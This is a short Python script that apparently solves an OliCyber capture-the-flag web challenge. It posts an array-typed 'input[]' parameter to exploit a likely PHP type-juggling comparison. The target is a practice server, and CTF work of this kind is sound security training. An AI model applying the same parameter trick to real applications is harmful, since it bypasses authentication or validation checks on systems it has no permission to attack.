from requests import *

URL = "http://soundofsilence.challs.olicyber.it/"

r = post(URL, data={"input[]":""})
print(r.text)
